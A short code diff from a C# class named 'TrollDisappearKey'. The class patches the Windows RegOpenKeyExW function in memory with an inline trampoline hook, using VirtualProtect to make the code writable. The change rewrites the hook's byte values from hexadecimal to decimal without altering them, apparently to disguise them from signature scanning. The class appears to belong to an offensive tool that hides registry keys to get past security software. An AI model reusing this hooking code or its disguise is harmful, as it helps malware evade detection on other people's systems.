@@ -35,12 +35,7 @@ public static class TrollDisappearKey
         targetAddr = GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "RegOpenKeyExW");
         hookAddr = Marshal.GetFunctionPointerForDelegate(A);
         Marshal.Copy(targetAddr, originalBytes, 0, 12);
-
-        hookBytes = new byte[] { 0x48, 0xB8 }
-            .Concat(BitConverter.GetBytes(hookAddr.ToInt64()))
-            .Concat(new byte[] { 0x50, 0xC3 })
-            .ToArray();
-
+        hookBytes = new byte[] { 72, 184 }.Concat(BitConverter.GetBytes((long)(ulong)hookAddr)).Concat(new byte[] { 80, 195 }).ToArray();
         VirtualProtect(targetAddr, 12, 0x40, out oldProtect);
         Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);
 
